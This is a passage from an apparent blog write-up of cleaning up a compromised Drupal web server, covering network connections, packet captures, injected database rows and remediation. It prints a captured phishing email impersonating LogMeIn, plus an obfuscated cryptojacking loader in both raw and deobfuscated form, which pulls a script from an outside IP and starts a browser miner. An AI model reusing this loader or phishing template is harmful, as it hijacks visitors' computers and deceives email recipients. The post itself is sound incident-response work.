</span></span><span style="display:flex;"><span>tcp        0      0 10.10.10.10:42186   98.137.157.43:25        TIME_WAIT
</span></span><span style="display:flex;"><span>tcp        0      1 10.10.10.10:45291   68.178.213.61:25        SYN_SENT
</span></span><span style="display:flex;"><span>tcp        0      0 10.10.10.10:37805   204.188.217.xx:80      ESTABLISHED
</span></span><span style="display:flex;"><span>tcp        0   2205 10.10.10.10:34654   216.120.254.206:25      ESTABLISHED
</span></span><span style="display:flex;"><span>tcp        0      1 10.10.10.10:39909   184.168.131.241:25      SYN_SENT
</span></span><span style="display:flex;"><span>tcp        0      1 10.10.10.10:48962   184.168.47.225:25       SYN_SENT
</span></span><span style="display:flex;"><span>tcp        0      0 10.10.10.10:38409   98.136.96.73:25         TIME_WAIT
</span></span><span style="display:flex;"><span>tcp        0      0 10.10.10.10:55883   216.251.100.19:25       ESTABLISHED
</span></span><span style="display:flex;"><span>tcp        0      0 10.10.10.10:32777   204.188.217.xx:80      ESTABLISHED
</span></span><span style="display:flex;"><span>tcp        0      1 10.10.10.10:33846   159.8.40.50:25          SYN_SENT
</span></span><span style="display:flex;"><span>tcp        0      1 10.10.10.10:47992   198.185.159.145:25      SYN_SENT
</span></span><span style="display:flex;"><span>tcp        0      1 10.10.10.10:39920   184.168.131.241:25      SYN_SENT
</span></span><span style="display:flex;"><span>tcp        0      0 10.10.10.10:37092   66.218.85.151:25        TIME_WAIT
</span></span><span style="display:flex;"><span>tcp6       0      0 :::80                   :::*                    LISTEN
</span></span><span style="display:flex;"><span>tcp6       0      0 :::22                   :::*                    LISTEN
</span></span><span style="display:flex;"><span>tcp6       0      0 :::25                   :::*                    LISTEN
</span></span><span style="display:flex;"><span>tcp6       0      0 :::443                  :::*                    LISTEN
</span></span><span style="display:flex;"><span>udp        0      0 10.10.10.10:123     0.0.0.0:*
</span></span><span style="display:flex;"><span>udp        0      0 127.0.0.1:123           0.0.0.0:*
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>Now there was even a SMTP port open (port <strong>25</strong>). I sniffed some packets on the SMTP port:</p>
<pre tabindex="0"><code>user@host:/var/www/subdomain$ sudo tshark &#34;port 25&#34;
Running as user &#34;root&#34; and group &#34;root&#34;. This could be dangerous.
tshark: Lua: Error during loading:
 /usr/share/wireshark/init.lua:32: dofile has been disabled due to running Wireshark as superuser. See https://wiki.wireshark.org/CaptureSetup/CapturePrivileges for help in running Wireshark as an unprivileged user.
Capturing on &#39;eth0&#39;
155 187.354503622  74.6.137.68 â†’ 10.10.10.10 SMTP 171 S: 250 sender &lt;www-data@www.website.ca&gt; ok | 250 recipient &lt;atheneos@atheneoscafe.com&gt; ok | 354 go ahead
156 187.354596107 10.10.10.10 â†’ 74.6.137.68  SMTP 1514 C: DATA fragment, 1448 bytes
157 187.354605929 10.10.10.10 â†’ 74.6.137.68  SMTP|IMF 853 subject: =?UTF-8?B?TG9nTWVJbiBOb3RpZmljYXRpb24gLSBDb21wdXRlciBJRDogMjg1MzI4NTczNSBkZWxldGVk?=, from: =?UTF
-8?B?TG9nTWVJbi5jb20=?= &lt;noreplay@logmein.com&gt;, ,   , &lt;p&gt;Event: Computer deleted&lt;/p&gt;  , &lt;p&gt;If this is an error, use the link bellow to restore your computer back.&lt;/p&gt;
, &lt;p&gt;&lt;a rel=&#34;nofollow noopener&#34; target=&#34;_blank&#34; href=&#34;https://restore.logmein.click/pc/?e=bmV0LmFzc2FzeW5AeWFob28uY29t&#34; style=&#34;outline: none; color: #00aeef; font-weight:
bold; text-decoration: none;&#34;&gt;http://restore.logmein.com/login.aspx?clusterid=YXRoZW5lb3NAYXRoZW5lb3NjYWZlLmNvbQ==&lt;/a&gt;&lt;br /&gt; &lt;br /&gt; Account holder: atheneos@atheneoscafe.com
&lt;br /&gt; Computer ID: 5714726389 &lt;br /&gt; At: 21.12.2018 13:03:20&lt;br /&gt; From: 127.0.0.1 (localhost)&lt;br /&gt; &lt;br /&gt; LogMeIn Account Holders can change notification settings
by clicking their LogMeIn ID in the upper-right corner of LogMeIn Central and then Account &amp;gt; Security &amp;gt; Account Audit.&lt;/p&gt;  , &lt;p&gt;&lt;/p&gt;  , &lt;p&gt;&lt;span style=&#34;color: #333333;
font-family: arial, sans-serif; font-size: 11px; font-style: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space:
normal; widows: 2; word-spacing: 0px; background-color: #ffffff; text-decoration-color: initial; display: inline !important; float: none;&#34;&gt;Copyright &amp;copy; 2003-2018 LogMeIn,
Inc.&lt;/span&gt;&lt;a rel=&#34;nofollow noopener&#34; target=&#34;_blank&#34; href=&#34;https://secure.logmein.com/policies/trademark.aspx&#34; style=&#34;margin: 0px; padding: 0px; border: 0px; font-style: normal;
font-weight: 400; font-stretch: inherit; font-size: 11px; line-height: inherit; font-family: arial, sans-serif; vertical-align: baseline; outline: 0px; color: #0088ce;
text-decoration: none; cursor: pointer; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px;
background-color: #ffffff;&#34;&gt;All rights reserved.&lt;/a&gt;&lt;/p&gt;  ,   ,   ,
</code></pre><p>This looked more like phishing activity and I thought there could be more dark things lurking in this machine. This explained why removing the scripts did not close the connections.</p>
<h2 id="phishing-attack">Phishing Attack</h2>
<p>I realized there were potentially 2 (common) ways to attacking this server: either through the <strong>ssh</strong> open port <strong>22</strong> or through the web application (hosted on port <strong>80</strong>). Since there were a lot of activity with the web-server, I visited the domain of the website and checked for suspicious elements on the background.</p>
<p>Upon visiting the siteâ€™s main page <a href="https://subdomain.website.ca">https://subdomain.website.ca</a> and when inspecting the elements on the HTML page of the site, I found a hidden javascript tag code:</p>
<p><img src="/post/crytojacking/suspicious_script.png" alt="Suspicious Script"></p>
<p>Just like any (in)sane person would do, I downloaded the file and took a look:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>user@host:$  wget http://wt-23...full-http-control
</span></span><span style="display:flex;"><span>user@host:$ cat full-http-control
</span></span><span style="display:flex;"><span>var _0x17e1=[&#34;script&#34;,&#34;createElement&#34;,&#34;type&#34;,&#34;text/javascript&#34;,&#34;readyState&#34;,&#34;onreadystatechange&#34;,&#34;loaded&#34;,&#34;complete&#34;,&#34;onload&#34;,&#34;src&#34;,&#34;appendChild&#34;,&#34;head&#34;,
</span></span><span style="display:flex;"><span>&#34;getElementsByTagName&#34;,&#34;http://146.185.234.xx/hhY6.js&#34;,&#34;undefined&#34;,&#34;stop&#34;,&#34;_client&#34;,&#34;56bc34061cd882609aab5de9d411b6e12be622137090334aa0697591bd8c7742&#34;,&#34;start&#34;];
</span></span><span style="display:flex;"><span>function loadScript(_0x17a8x2,_0x17a8x3){var _0x17a8x4=document[_0x17e1[1]](_0x17e1[0]);_0x17a8x4[_0x17e1[2]]= _0x17e1[3];if(_0x17a8x4[_0x17e1[4]])
</span></span><span style="display:flex;"><span>{_0x17a8x4[_0x17e1[5]]= function(){if(_0x17a8x4[_0x17e1[4]]== _0x17e1[6]|| _0x17a8x4[_0x17e1[4]]== _0x17e1[7]){_0x17a8x4[_0x17e1[5]]= null;_0x17a8x3()}}}
</span></span><span style="display:flex;"><span>else {_0x17a8x4[_0x17e1[8]]= function(){_0x17a8x3()}};_0x17a8x4[_0x17e1[9]]= _0x17a8x2;document[_0x17e1[12]](_0x17e1[11])[0][_0x17e1[10]](_0x17a8x4)}
</span></span><span style="display:flex;"><span>loadScript(_0x17e1[13],function(){setTimeout(function(){if( typeof (miner)!= _0x17e1[14]){try{miner[_0x17e1[15]]()}catch(e){}};if( typeof (_client)!=
</span></span><span style="display:flex;"><span>_0x17e1[14]){try{_client[_0x17e1[15]]()}catch(e){}};document[_0x17e1[16]]=  new
</span></span><span style="display:flex;"><span>Client.Anonymous(_0x17e1[17],{throttle:0.3});document[_0x17e1[16]][_0x17e1[18]](Client.FORCE_MULTI_TAB)},1000)})
</span></span></code></pre></div><p>A cleaner version would be:</p>
<pre tabindex="0"><code>var _0x17e1=
[&#34;script&#34;,
&#34;createElement&#34;,
&#34;Type&#34;,
&#34;text/javascript&#34;,
&#34;readyState&#34;,
&#34;Onreadystatechange&#34;,
&#34;Loaded&#34;,
&#34;Complete&#34;,
&#34;Onload&#34;,
&#34;Src&#34;,
&#34;appendChild&#34;,
&#34;Head&#34;,
&#34;getElementsByTagName&#34;,
&#34;http://146.185.234.xx/hhY6.js&#34;,
&#34;Undefined&#34;,
&#34;Stop&#34;,
&#34;_client&#34;,
&#34;56bc34061cd882609aab5de9d411b6e12be622137090334aa0697591bd8c7742&#34;,
&#34;Start&#34;];
function loadScript(_0x17a8x2,_0x17a8x3){
  var _0x17a8x4 = document[_0x17e1[1]](_0x17e1[0]);
  _0x17a8x4[_0x17e1[2]] = _0x17e1[3];
if(_0x17a8x4[_0x17e1[4]]){
  _0x17a8x4[_0x17e1[5]] = function(){
    if(_0x17a8x4[_0x17e1[4]] == _0x17e1[6] || _0x17a8x4[_0x17e1[4]] == _0x17e1[7]){
      _0x17a8x4[_0x17e1[5]] = null;_0x17a8x3()}}}else {_0x17a8x4[_0x17e1[8]]= function(){_0x17a8x3()}};_0x17a8x4[_0x17e1[9]]= _0x17a8x2;document[_0x17e1[12]](_0x17e1[11])[0][_0x17e1[10]](_0x17a8x4)}loadScript(_0x17e1[13],function(){setTimeout(function(){if( typeof (miner)!= _0x17e1[14]){try{miner[_0x17e1[15]]()}catch(e){}};if( typeof (_client)!= _0x17e1[14]){try{_client[_0x17e1[15]]()}catch(e){}};document[_0x17e1[16]]=  new Client.Anonymous(_0x17e1[17],{throttle:0.3});document[_0x17e1[16]][_0x17e1[18]](Client.FORCE_MULTI_TAB)},1000)})
</code></pre><p>So, this link fetched some malicious script to load hhY6.js. I tried to unravel the loadScript functions for better verbosity:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ae81ff">0x17e1</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;script&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x17e1</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;createElement&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x17e1</span>[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;type&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x17e1</span>[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;text/javascript&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x17e1</span>[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;readyState&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x17e1</span>[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;onreadystatechange&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x17e1</span>[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;loaded&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x17e1</span>[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;complete&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x17e1</span>[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;onload&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x17e1</span>[<span style="color:#ae81ff">9</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;src&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x17e1</span>[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;appendChild&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x17e1</span>[<span style="color:#ae81ff">11</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;head&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x17e1</span>[<span style="color:#ae81ff">12</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;getElementsByTagName&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x17e1</span>[<span style="color:#ae81ff">13</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://146.185.234.xx/hhY6.js&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x17e1</span>[<span style="color:#ae81ff">14</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;undefined&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x17e1</span>[<span style="color:#ae81ff">15</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;stop&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x17e1</span>[<span style="color:#ae81ff">16</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;_client&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x17e1</span>[<span style="color:#ae81ff">17</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;56bc34061cd882609aab5de9d411b6e12be622137090334aa0697591bd8c7742&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x17e1</span>[<span style="color:#ae81ff">18</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;start&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">loadScript</span>(<span style="color:#a6e22e">_0x17a8x2</span>,<span style="color:#a6e22e">_0x17a8x3</span>){
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_0x17a8x4</span> <span style="color:#f92672">=</span> document[<span style="color:#e6db74">&#34;createElement&#34;</span>](<span style="color:#e6db74">&#34;script&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">_0x17a8x4</span>[<span style="color:#e6db74">&#34;type&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;text/javascript&#34;</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">_0x17a8x4</span>[<span style="color:#e6db74">&#34;readyState&#34;</span>]){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_0x17a8x4</span>[<span style="color:#e6db74">&#34;onreadystatechange&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(){
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">_0x17a8x4</span>[<span style="color:#e6db74">&#34;readyState&#34;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;loaded&#34;</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">_0x17a8x4</span>[<span style="color:#e6db74">&#34;readyState&#34;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;complete&#34;</span>){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">_0x17a8x4</span>[<span style="color:#e6db74">&#34;onreadystatechange&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">_0x17a8x3</span>()
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_0x17a8x4</span>[<span style="color:#e6db74">&#34;onload&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(){
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">_0x17a8x3</span>()
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  };
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">_0x17a8x4</span>[<span style="color:#e6db74">&#34;src&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x17a8x2</span>;
</span></span><span style="display:flex;"><span>  document[<span style="color:#e6db74">&#34;getElementsByTagName&#34;</span>](<span style="color:#e6db74">&#34;head&#34;</span>)[<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#34;appendChild&#34;</span>](<span style="color:#a6e22e">_0x17a8x4</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">loadScript</span>(<span style="color:#e6db74">&#34;http://146.185.234.xx/hhY6.js&#34;</span>,<span style="color:#66d9ef">function</span>(){
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setTimeout</span>(<span style="color:#66d9ef">function</span>(){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>( <span style="color:#66d9ef">typeof</span> (<span style="color:#a6e22e">miner</span>)<span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;undefined&#34;</span>){
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">try</span>{<span style="color:#a6e22e">miner</span>[<span style="color:#e6db74">&#34;stop&#34;</span>]()}
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>){}
</span></span><span style="display:flex;"><span>    };
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>( <span style="color:#66d9ef">typeof</span> (<span style="color:#a6e22e">_client</span>)<span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;undefined&#34;</span>){
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">try</span>{<span style="color:#a6e22e">_client</span>[<span style="color:#e6db74">&#34;stop&#34;</span>]()}
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>){}
</span></span><span style="display:flex;"><span>    };
</span></span><span style="display:flex;"><span>    document[<span style="color:#e6db74">&#34;_client&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Client</span>.<span style="color:#a6e22e">Anonymous</span>(<span style="color:#e6db74">&#34;56bc34061cd882609aab5de9d411b6e12be622137090334aa0697591bd8c7742&#34;</span>,{<span style="color:#a6e22e">throttle</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0.3</span>});
</span></span><span style="display:flex;"><span>    document[<span style="color:#e6db74">&#34;_client&#34;</span>][<span style="color:#e6db74">&#34;start&#34;</span>](<span style="color:#a6e22e">Client</span>.<span style="color:#a6e22e">FORCE_MULTI_TAB</span>)
</span></span><span style="display:flex;"><span>  },<span style="color:#ae81ff">1000</span>)
</span></span><span style="display:flex;"><span>})
</span></span></code></pre></div><p>This script was trying to load more cryptojacking scripts. It had a similar resemblance to: <a href="https://coinhive.com/documentation/miner">https://coinhive.com/documentation/miner</a></p>
<h3 id="mysql-database-analysis">MySQL Database Analysis</h3>
<p>Drupal uses MySQL database to load HTML content from modules. The hidden malicious javascript code (found in HTML) was injected in a MySQL table: <strong>block_custom</strong> in database: <strong>subdomainsite</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>|   8 | &lt;script type=&#34;text/javascript&#34; src=&#34;https://wt-23afbbf05d73a701c3ef54b49e4de14c-0.sandbox.auth0-extend.com/full-http-control&#34;&gt;&lt;/script&gt;
</span></span><span style="display:flex;"><span>| drupal update | php_code |
</span></span><span style="display:flex;"><span>|   9 | &lt;script type=&#34;text/javascript&#34; src=&#34;https://wt-23afbbf05d73a701c3ef54b49e4de14c-0.sandbox.auth0-extend.com/full-http-control&#34;&gt;&lt;/script&gt;
</span></span><span style="display:flex;"><span>| drupal updater | full_html |
</span></span></code></pre></div><p>While looking at the table rows, the links were trying to force the site to load the cryptojacking scripts. I cleaned up these rows from MySQL:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>mysql&gt; delete from block_custom where bid=8;
</span></span><span style="display:flex;"><span>Query OK, 1 row affected (0.05 sec)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>mysql&gt; delete from block_custom where bid=9;
</span></span><span style="display:flex;"><span>Query OK, 1 row affected (0.03 sec)
</span></span></code></pre></div><p>After deleting the rows, the footer code disappeared, thus removing the malware from loading on the page &#x1f389; &#x1f389; &#x1f389;</p>
<p>Also, when looking at MySQL command history:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>user@host:/var/www/subdomain$ cat ~/.mysql_history
</span></span><span style="display:flex;"><span>show databases;
</span></span><span style="display:flex;"><span>use subdomainsite;
</span></span><span style="display:flex;"><span>show tales;
</span></span><span style="display:flex;"><span>show tables;
</span></span><span style="display:flex;"><span>select column from users;
</span></span><span style="display:flex;"><span>select * from users;
</span></span><span style="display:flex;"><span>show cloumns from users;
</span></span><span style="display:flex;"><span>show columns from users;
</span></span><span style="display:flex;"><span>select mail from users;
</span></span><span style="display:flex;"><span>show databases;
</span></span><span style="display:flex;"><span>use subdomainsite;
</span></span><span style="display:flex;"><span>select * from users;
</span></span><span style="display:flex;"><span>show columns from users;
</span></span><span style="display:flex;"><span>select * from users where mail like &#39;@drupaler%&#39;;
</span></span><span style="display:flex;"><span>select * from users where mail like &#39;%@drupaler%&#39;;
</span></span><span style="display:flex;"><span>delete from users where mail like &#39;%@drupaler%&#39;;
</span></span><span style="display:flex;"><span>select mail from users;
</span></span><span style="display:flex;"><span>show databases;
</span></span><span style="display:flex;"><span>use subdomainsite;
</span></span><span style="display:flex;"><span>select mail from users;
</span></span><span style="display:flex;"><span>select * from users where mail like &#39;%brainhard%&#39;;
</span></span><span style="display:flex;"><span>delete from users where mail like &#39;%brainhard%&#39;;
</span></span><span style="display:flex;"><span>select mail from users;
</span></span><span style="display:flex;"><span>delete from users where mail like &#39;%bee@addmyhome.com%&#39;;
</span></span><span style="display:flex;"><span>delete from users where mail like &#39;%canie.assassins-creed.org%&#39;;
</span></span><span style="display:flex;"><span>delete from users where mail like &#39;%quinn.adkins38@visitnorwayusa.com%&#39;;
</span></span><span style="display:flex;"><span>delete from users where mail like &#39;%menherbalenhancement.com%&#39;;
</span></span><span style="display:flex;"><span>show databases;
</span></span><span style="display:flex;"><span>use WordPressDB;
</span></span><span style="display:flex;"><span>show tables;
</span></span><span style="display:flex;"><span>describe wp_posts;
</span></span><span style="display:flex;"><span>select * from wp_posts;
</span></span><span style="display:flex;"><span>describe wp_posts;
</span></span><span style="display:flex;"><span>show databases;
</span></span><span style="display:flex;"><span>use subdomainsite;
</span></span><span style="display:flex;"><span>select mail from users;
</span></span><span style="display:flex;"><span>select * from users where mail like &#39;%@drupaler%&#39;;
</span></span><span style="display:flex;"><span>select * from users where mail like &#39;%drupaler%&#39;;
</span></span><span style="display:flex;"><span>select * from users where mail like &#39;%drupal%&#39;;
</span></span><span style="display:flex;"><span>select mail from users where mail like &#39;%drupal%&#39;;
</span></span><span style="display:flex;"><span>delete from users where mail like &#39;%drupal%&#39;;
</span></span><span style="display:flex;"><span>select mail from users;
</span></span><span style="display:flex;"><span>use subdomainsite;
</span></span><span style="display:flex;"><span>select mail from users;
</span></span><span style="display:flex;"><span>show databases;
</span></span><span style="display:flex;"><span>use WordPressDB;
</span></span><span style="display:flex;"><span>show tables;
</span></span><span style="display:flex;"><span>describe wp_users;
</span></span><span style="display:flex;"><span>select * from wp_users; â€¦
</span></span></code></pre></div><p>It looked like they tried to delete their spamming email domains: <a href="https://www.pozzo-balbi.com/help/List_of_email_spamming_domains">https://www.pozzo-balbi.com/help/List_of_email_spamming_domains</a></p>
<h4 id="confetti_ball-now-the-webshell-irc-connections-and-phishing-activities-stopped-confetti_ball">&#x1f38a; Now, the webshell IRC connections and phishing activities stopped! &#x1f38a;</h4>
<h2 id="conclusion">Conclusion</h2>
<p><strong>&#x203c;&#xfe0f; MAIN CAUSE &#x203c;&#xfe0f; : The current Drupal version (running on the webserver) has a vulnerability for XSS attacks. This was confirmed with grabber vulnerability scanner tool.</strong></p>
<p><strong>&#x2705; SOLUTION &#x2705; : Patch systems regularly and keep an eye out for vulnerabilities. We can install Host-based and/or Network-based Intrusion Detection Systems for good measure</strong></p>
<h3 id="cleaning-up">Cleaning Up</h3>
<p>Since we were not using the subdomain site, I simply shut it down:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$vim /etc/apache2/sites-available/default-ssl.conf
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>   #&lt;VirtualHost _default_:443&gt;
</span></span><span style="display:flex;"><span>    #    ServerAdmin admin@email.ca
</span></span><span style="display:flex;"><span>    #    ServerName  subdomain.website.ca
</span></span><span style="display:flex;"><span>    #    # Indexes + Directory Root.
</span></span><span style="display:flex;"><span>    #    DirectoryIndex index.php
</span></span><span style="display:flex;"><span>    #    DocumentRoot /var/www/subdomain/
</span></span><span style="display:flex;"><span>    # â€¦
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>$sudo service apache2 restart
</span></span></code></pre></div><p>For safety purposes, I also blocked SMTP Port and stopped the mail service:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>sudo iptables -A INPUT -i eth0 -p tcp --destination-port 25 -j DROP
</span></span><span style="display:flex;"><span>sudo /etc/init.d/postfix stop
</span></span></code></pre></div>
    
  </article>

  <button onclick="topFunction()" id="back-to-top" title="Go to top">Back to Top</button>

  

<div id="sharingbuttons">
    
    

    
    

    
    

    
    

    
    

    
    

    
    

    
    
</div>
  <div class="paginator">
    
    <a></a>
    
    
    <a class="link" href="https://rajsimmanravi.github.io/posts/datadog/datadog-grafana/" title="Datadog vs Grafana Dashboards">next â†’</a>
    
  </div>
  <div class="comment">
    
    
    
    <div id="cusdis_thread"
  data-host="https://cusdis.com"
  data-app-id="f939890a-dcf4-4428-b5c4-1cf423afaa55"
  data-page-id="{{ .File.UniqueID }}"
  data-page-url="{{ .Permalink }}"
  data-page-title="{{ .Title }}"
></div>
<script async defer src="https://cusdis.com/js/cusdis.es.js"></script>
  
  </div>
  
  
</main>

    <footer id="footer">
  <div>
    <span>Powered by  <a class=link href=https://gohugo.io target=_blank rel=noopener>Hugo</a> | 
Theme <a class=link href=https://github.com/michaelneuper/hugo-texify3 target=_blank rel=noopener>TeXify3</a>
</span>
  </div>
  <div>
    <span>Copyright Â© 2025 </span>
  </div>
</footer>

  </div>

  
  <script src='https://rajsimmanravi.github.io/js/script.js' defer></script>

  
  

  
  

  
  

</body>

</html>
